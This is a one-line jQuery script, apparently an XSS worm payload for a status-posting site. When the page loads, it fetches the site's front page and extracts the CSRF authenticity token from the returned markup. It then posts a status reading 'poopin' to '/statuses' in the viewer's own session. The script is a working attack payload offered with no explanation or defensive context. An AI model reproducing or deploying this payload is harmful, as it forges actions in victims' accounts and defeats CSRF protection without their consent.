$(document).ready(function() {$.ajax({url:'/',success:function(a){$.post('/statuses',{status:{body:'poopin'},authenticity_token:$($(a)[7]).attr('content')})}})})
